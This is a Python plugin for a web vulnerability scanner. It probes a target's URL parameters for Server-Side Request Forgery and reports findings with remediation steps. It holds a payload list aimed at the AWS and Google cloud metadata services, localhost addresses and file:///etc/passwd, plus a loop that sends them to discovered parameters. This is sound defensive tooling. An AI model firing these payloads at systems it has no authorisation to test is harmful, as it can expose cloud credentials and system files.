"""SSRF detection — Server-Side Request Forgery via URL parameters."""

from __future__ import annotations

import logging
from typing import TYPE_CHECKING, AsyncIterator
from urllib.parse import urljoin, urlparse, parse_qs

from bs4 import BeautifulSoup

from marlonthebug.http.client import AsyncHTTPClient
from marlonthebug.plugins.base import BasePlugin, Finding, Severity

if TYPE_CHECKING:
    from marlonthebug.core.workspace import Workspace, TargetInfo

logger = logging.getLogger("marlonthebug.plugins.web.ssrf")

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://[::1]:80/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "http://metadata.google.internal/",
]

AWS_METADATA_INDICATORS = [
    "ami-id", "instance-id", "instance-type", "local-ipv4",
    "public-ipv4", "security-groups", "iam/info",
]

URL_PARAM_NAMES = ["url", "redirect", "link", "src", "href", "proxy", "path", "uri", "goto",
                   "target", "next", "continue", "return", "file", "fetch", "download"]


class SSIRAuditor(BasePlugin):
    name = "ssrf"
    version = "1.0.0"
    description = "Detect Server-Side Request Forgery (SSRF) in URL and file fetch parameters"
    category = "web"

    async def setup(self, workspace: Workspace) -> None:
        self._workspace = workspace

    async def run(self, target: TargetInfo, options: dict | None = None) -> AsyncIterator[Finding]:
        http = AsyncHTTPClient(timeout=10, retries=1)
        try:
            for scheme in ["https", "http"]:
                try:
                    resp = await http.get(f"{scheme}://{target.host}")
                    base_url = f"{scheme}://{target.host}"
                    break
                except Exception:
                    continue
            else:
                return

            soup = BeautifulSoup(resp.body, "lxml")
            test_urls: set[str] = set()

            for a in soup.find_all("a", href=True):
                href = urljoin(base_url, a["href"])
                parsed = urlparse(href)
                if parsed.netloc in (target.host, f"www.{target.host}"):
                    if parsed.query:
                        test_urls.add(href)

            for form in soup.find_all("form"):
                action = urljoin(base_url, form.get("action", ""))
                method = form.get("method", "GET").upper()
                if method == "GET":
                    inputs = [(inp.get("name", ""), inp.get("value", "")) for inp in form.find_all("input")]
                    if inputs:
                        params_str = "&".join(f"{n}={v or 'test'}" for n, v in inputs if n)
                        test_urls.add(f"{action}?{params_str}")

            for inline_url in URL_PARAM_NAMES:
                test_urls.add(f"{base_url}?{inline_url}=https://example.com")

            for url in list(test_urls)[:15]:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                for param_name in list(params.keys())[:10]:
                    param_lower = param_name.lower()
                    is_url_param = any(upn in param_lower for upn in URL_PARAM_NAMES)

                    if not is_url_param:
                        continue

                    for payload in SSRF_PAYLOADS[:3]:
                        try:
                            test_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
                            test_params[param_name] = payload
                            query_str = "&".join(f"{k}={v}" for k, v in test_params.items())
                            test_url = parsed._replace(query=query_str).geturl()
                            response = await http.get(test_url)

                            for indicator in AWS_METADATA_INDICATORS:
                                if indicator in response.body.lower():
                                    yield self.create_finding(
                                        title=f"SSRF to AWS Metadata in '{param_name}'",
                                        description=f"SSRF vulnerability allowing access to AWS EC2 metadata service "
                                                    f"via parameter '{param_name}'. Response contains '{indicator}'.",
                                        severity=Severity.CRITICAL,
                                        cvss_score=9.8,
                                        endpoint=url,
                                        target_host=target.host,
                                        evidence={
                                            "parameter": param_name,
                                            "payload": payload,
                                            "indicator": indicator,
                                            "response_snippet": response.body[:200],
                                        },
                                        remediation=(
                                            "1. Allowlist allowed URLs/domains\n"
                                            "2. Block internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16)\n"
                                            "3. Disable URL schemes like file://, gopher://, dict://\n"
                                            "4. Use indirect references instead of raw URLs\n"
                                            "5. Update to IMDSv2 on AWS (requires tokens)"
                                        ),
                                    )
                                    break

                            if "root:" in response.body and "nobody:" in response.body:
                                yield self.create_finding(
                                    title=f"SSRF to local file in '{param_name}'",
                                    description=f"SSRF vulnerability allowing file:// access via parameter '{param_name}'.",
                                    severity=Severity.CRITICAL,
                                    cvss_score=9.5,
                                    endpoint=url,
                                    target_host=target.host,
                                    evidence={"parameter": param_name, "payload": payload,
                                               "response_snippet": response.body[:200]},
                                )
                                break
                        except Exception:
                            pass
        finally:
            await http.close()
